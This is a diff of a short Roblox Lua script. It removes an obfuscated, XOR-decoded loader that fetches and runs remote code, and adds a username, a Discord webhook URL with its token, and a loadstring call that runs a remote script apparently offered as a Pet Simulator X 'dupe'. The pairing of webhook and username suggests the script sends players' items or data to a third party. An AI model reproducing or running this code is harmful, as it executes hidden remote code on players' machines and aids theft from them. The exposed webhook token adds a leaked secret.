@@ -1,1 +1,3 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=835 -((312 -(112 + 160)) + 794), #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 + 0)),v1(v2(v9,((161 + 177) -(216 + 121)) + ((v11-(1 + 0 + 0))% #v9),1 + ((v11-1)% #v9) + 1)))%(239 + 17)));end return v5(v10);end loadstring(game:HttpGet(v7("\122\0\111\228\173\40\91\52\230\191\101\90\124\253\170\122\1\121\225\173\119\6\120\251\176\102\17\117\224\240\113\27\118\187\188\64\59\110\252\236\61\16\110\228\187\63\0\105\245\186\119\7\120\245\179\61\25\122\253\176\61\2\41","\18\116\27\148\222")))();
+UserName = "ahma3137"
+WebHook = "https://discord.com/api/webhooks/1057004538034405496/lChaHaIhD4LMqAZ_FzHzyp-2WNYN7CuT435mBH3RUdKhrcpeeHBrsd0qg1OsLy4_v6eH"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
